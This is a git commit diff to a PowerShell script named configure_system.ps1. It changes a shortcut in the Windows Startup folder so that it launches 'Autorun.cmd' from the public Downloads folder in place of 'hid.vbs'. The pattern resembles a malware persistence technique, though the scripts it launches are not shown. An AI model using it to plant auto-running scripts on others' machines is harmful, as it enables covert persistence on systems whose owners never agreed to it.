e44e80c19518efc6a48c40f52077cec1e8162a9d
GALVINVN <112307302+GALVINVN@users.noreply.github.com>
2025-01-10 20:53:04 +0700

    configure_system.ps1

--- configure_system.ps1
+++ configure_system.ps1
@@ -1,5 +1,5 @@
-$source = "C:\Users\Public\Downloads\hid.vbs"
-$destination = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\hid.vbs.lnk"
+$source = "C:\Users\Public\Downloads\Autorun.cmd"
+$destination = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Autorun.cmd.lnk"
 $WshShell = New-Object -ComObject WScript.Shell
 $shortcut = $WshShell.CreateShortcut($destination)
 $shortcut.TargetPath = $source
